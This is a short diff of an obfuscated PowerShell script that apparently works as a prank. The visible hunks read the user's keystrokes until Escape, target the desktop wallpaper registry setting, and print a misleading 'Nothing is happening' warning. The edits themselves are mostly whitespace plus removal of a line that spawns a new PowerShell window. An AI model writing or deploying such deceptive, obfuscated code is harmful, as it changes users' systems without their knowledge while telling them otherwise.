@@ -15,7 +15,7 @@ function Q6L {
     $sV6j = [System.Collections.ArrayList]::new()
     while ($aP3g) {
         $gX8r = [System.Console]::ReadKey($true)
-        if ($gX8r.Key -eq [System.ConsoleKey]::Escape){
+        if ($gX8r.Key -eq [System.ConsoleKey]::Escape) {
             $aP3g = $false
         }
         $sV6j.Add($gX8r.keychar)
@@ -30,6 +30,7 @@ function H6L {
         $U2p++
     }
 }
+
 function T3m {
     $R9c = "HKCU:Control Panel\Desktop"
     $Z4h = "WallPaper"
@@ -48,8 +49,6 @@ function Y3J {
 }
 
 Write-Warning "Warning Nothing is happening"
-
-Start-Process powershell
 
 ZzR
 H6L
